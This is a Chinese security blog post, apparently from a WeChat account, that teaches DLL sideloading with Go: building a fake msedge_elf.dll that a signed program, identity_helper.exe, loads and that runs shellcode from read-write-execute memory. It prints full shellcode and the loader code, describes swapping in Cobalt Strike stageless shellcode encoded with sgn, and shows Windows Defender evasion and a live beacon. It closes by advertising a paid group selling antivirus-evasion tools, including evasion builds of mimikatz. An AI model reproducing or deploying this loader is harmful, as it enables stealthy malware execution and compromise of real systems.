<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HIPNfz1dpHglFifbHsl8Pg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkJrGicxw4mL5UYpL9RmBdKdft5iatHZicb4BrxO3ENyQOEVKKDeSwTG2Jw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

点击蓝字，关注 Sec 探索者，一起探索网络安全技术

  

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

      请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。如有侵权烦请告知，我们会立即删除并致歉。谢谢！

**01**

**环境准备**

![](https://mmbiz.qpic.cn/mmbiz_gif/Melo944GVOJECe5vg2C5YWgpyo1D5bCkEPVCSE8TicyQLuettC2pcGgfe3PY8L2lHia8ZWLcNr1Fz7p3pb69Voow/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)

1.golang

2.mingw64

下载地址  

```
https://sourceforge.net/projects/mingw-w64/files/

```

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5KITW2GBQjFnp2KeDyraRibokDic2jlboVLKR1XUMtictVyxeHaG97ibt7A/640?wx_fmt=png&from=appmsg)

注意: sjlj 版本支持 32 位和 64 位编译，seh 版本仅支持 64 位程序编译; posix 版本封装一层，并没有直接调用 windows API，而 win32 版本直接调用了 windows API，性能更好, 对于跨平台编译的话我建议选择 posix-sjlj 版本，这样可以很方便编译 dl 和 so 文件，缺点是文件稍微大一些，编译速度慢一些. 我这里选择的是 (x86_64-posix-sjlj), 下载后之后把解压目录下的 bin 加入到环境变量中

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5wmvoGWFqfd2j25Z5GKSqo75902BMiaxFtJOMw6bUuGNyx2NtlsEYYWA/640?wx_fmt=png&from=appmsg)

设置 go  

```
set CGO_ENABLED=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5MEnGycoTmAzFtG3ic7j4t9hgicnXia5TyUA8S4RPHnvVB0faK9v9KzMRA/640?wx_fmt=png&from=appmsg)

**02**

**示例代码  
**

![](https://mmbiz.qpic.cn/mmbiz_gif/Melo944GVOJECe5vg2C5YWgpyo1D5bCkEPVCSE8TicyQLuettC2pcGgfe3PY8L2lHia8ZWLcNr1Fz7p3pb69Voow/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)

main.go

```
package main
import "C"
//export Add
func Add(a, b int) int {
  return a + b
}
func main() {
}

```

//export Add: 定义导出函数

必须要有 main 函数

编译 dll 命令

```
go build -ldflags="-w -s" -buildmode=c-shared -o dll1.dll main.go

```

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5goyveVJwCmWISwBOjhibIQEKVTTQW7Y1B5VaPVdE3YCVvPv3r2YDOuw/640?wx_fmt=png&from=appmsg)

编写 exe 测试

main.go

```
package main
import (
  "fmt"
  "syscall"
)
func main() {
  handle := syscall.MustLoadDLL("dll1.dll")
  Add := handle.MustFindProc("Add")
  res, _, _ := Add.Call(2, 3)
  fmt.Println(res)
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5BjFz2YZbwXLftp3XKgdXnm637xz4mC5BEic3SZicebTmic1WrquM1l8aA/640?wx_fmt=png&from=appmsg)

成功调用 dll 文件中的导出函数

**03**

**实操白加黑上线 cs  
**

![](https://mmbiz.qpic.cn/mmbiz_gif/Melo944GVOJECe5vg2C5YWgpyo1D5bCkEPVCSE8TicyQLuettC2pcGgfe3PY8L2lHia8ZWLcNr1Fz7p3pb69Voow/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)

使用 identity_helper.exe 白程序测试

main.go

```
package main
import "C"
import (
  "golang.org/x/sys/windows"
  "syscall"
  "unsafe"
)
//export GetInstallDetailsPayload
func GetInstallDetailsPayload() int {
  handle := windows.NewLazySystemDLL("kernel32.dll")
  VirtualAlloc := handle.NewProc("VirtualAlloc")
  RtlMoveMemory := handle.NewProc("RtlMoveMemory")
  // 运行计算器shellcode
  sc := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00}
  addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
  syscall.SyscallN(addr)
  return 0
}
//export SignalInitializeCrashReporting
func SignalInitializeCrashReporting() int {
  return 0
}
func main() {
}

```

编译 dll 命令  

```
go build -ldflags="-w -s" -buildmode=c-shared -o msedge_elf.dll main.go

```

‍

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5GMiab4g0EMDGZC005Hd0r30Qze2d7M792ZWQKKvyTA4PHlDwohbdhlw/640?wx_fmt=png&from=appmsg)

替换成 cs 的 shellcode, cs 的无阶段的 shellcode 使用 sgn 进行处理

```
package main
import "C"
import (
  "golang.org/x/sys/windows"
  "syscall"
  "unsafe"
)
//export GetInstallDetailsPayload
func GetInstallDetailsPayload() int {
  sc := []byte{0xe8,0x2b,0x00...} // cs的无阶段的shellcode使用sgn进行处理
  handle := windows.NewLazySystemDLL("kernel32.dll")
  VirtualAlloc := handle.NewProc("VirtualAlloc")
  RtlMoveMemory := handle.NewProc("RtlMoveMemory")
  addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
  RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
  syscall.SyscallN(addr)
  return 0
}
//export SignalInitializeCrashReporting
func SignalInitializeCrashReporting() int {
  return 0
}
func main() {
}

```

编译

```
go build -ldflags="-w -s" -buildmode=c-shared -o msedge_elf.dll main.go

```

‍使用 defender 查杀测试, 免杀 defender

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5pO4Kib4C2c1ibabImA33uf9NOWibUOPhH3icYWTFiaVstSUNSDSyxZAo9GQ/640?wx_fmt=png&from=appmsg)

上线 cs

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5pOAJcYtgVNFQBh8ibg9Xor1OAT2pNzHoCLdnQGw8x3GufLJAYrNOdsg/640?wx_fmt=png&from=appmsg)

执行系统命令, 动态免杀 defender

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOLErY6lc7baun6Msr4bO7w5sUmyLziaswI7LuKhereap5Z82FSdKvYeBNbgftV6Mt9SLP2oic60Ohng/640?wx_fmt=png&from=appmsg)

成功免杀 defender

**04**

**圈子介绍  
**

![](https://mmbiz.qpic.cn/mmbiz_gif/Melo944GVOJECe5vg2C5YWgpyo1D5bCkEPVCSE8TicyQLuettC2pcGgfe3PY8L2lHia8ZWLcNr1Fz7p3pb69Voow/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)

进付费圈子获取更多的未公开免杀工具和免杀思路, 以及圈子内部独家直播免杀分享

![](https://mmbiz.qpic.cn/mmbiz_jpg/Melo944GVOJzGMy4oyaWxBTPgoHVK0Ey6jcuHwmMGtAQIcdwhs8SRHynib6GImXO1ejvxgzMMtyJv7pnX7FnQYw/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/Melo944GVOJqGWeA0ibRojIvibZ7IND43bx32XLvaFic4mRAISdSzmiaE1oSI2xeapZibAMtVglVpF2Qia2jouiciaNK4Q/640?wx_fmt=jpeg&from=appmsg)

早就早享受, 且价格更优惠, 随着内容的更新, 圈子也在不断涨价

目前已经更新的免杀内容

*   免杀卡巴斯基上线 cs
    
*   360 永久免杀的秘密 (全网首发)  
    
*   360 免杀马生成器
    
*   火绒免杀马生成器
    
*   defender 免杀马生成器
    
*   fscan 免杀版
    
*   mimikatz 免杀版, 实战可过亚信
    
*   HackBrowserData 免杀版
    
*   内网多级代理工具免杀版  
    
*   360 添加用户免杀版
    
*   360 永久免杀分离加载器  
    
*   火绒添加用户免杀方法  
    
*   360 传输报毒解决方案
    
*   白加黑批量挖掘工具  
    
*   CheckGoBuild.exe fuzz go 编译参数工具  
    
*   白加黑武器化工具 GenDLLFile.exe
    
*   x 步云沙箱环境信息获取工具
    
*   sctool.exe 处理 shellcode 文件工具
    
*   FileEntropyAnalyzer 一款查看文件熵值的工具  
    
*   大白哥版二开 cs 等
    
*   会持续一直更新免杀
    

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0EykSlNWWk7cfibkOTQuxa2cGDg3ALKCGia8RzJic6NZJZjxjxeYtVnGveGw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Ey0qhfqiayGtKkfdmwtScxQqjQ0sHPVC3ibQ02tkA5Cva02LmqlicTQ2iaAw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Eyricz6YzjicjCOHHuqWkmHwTdwpUg8QKNwoQ5WPy34qe7ZJIaU5TfScNA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0EyWdZHl97ZjNVLbhmRB7rv1AIydqnHTTPzHCf2ptC4Ivo8ZOLwWgiasog/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Eyiaib6qbte8kfppbibMiaPS8Sia40ocodhrHwwYbiarM6hYHy4oOyc0icUgbZQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0EyB72xQaNnx8u4EH1mayibajto9Rz0pLeCZ32Fficj4ia3OrbnlXzplroKA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Eyo4oPNO9Zx7ibibYxt0skkWD6gF7NTc9WA3lBvpBtjlZiclqTLVKuY3ZtQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Ey4We6Kn44jBdZTIKtQECaFicj80ya5EibxQPGpnX9HokyKEKGryqJEgRA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0Eydicic6BoI0gMXL9WibRNTAto7r8KvfPdhANWThxbCws1ibplN2o89UPZOg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0EyF4rQnboCEULfAhFTldKnNMrxPdkthHkne7iaK6RggHh6rUy79I1WevQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJzGMy4oyaWxBTPgoHVK0EyrlC26k3keoRCrWvxMwPHupmnrGzEOjQdjKqjxricwwazS5H2ngX0KkQ/640?wx_fmt=png&from=appmsg)

等等....

如果你想要从 0 基础科学系统的学习免杀课，请联系大白哥

![](https://mmbiz.qpic.cn/mmbiz_jpg/Melo944GVOKkpVhKtgYrDbM4vDMtDhSXTFyGiaNxe743LcibzRh67dndaMFzpYcQYltV8MEKBVXTQlF0NYA5LshQ/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/Melo944GVOIOyOhEZkrWlcianYlTNGEkfxOuWBhteCiaRdaHtePHhJMovro0Xia8kibfibrTD6TZPkMibu0pzvicIzHLg/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)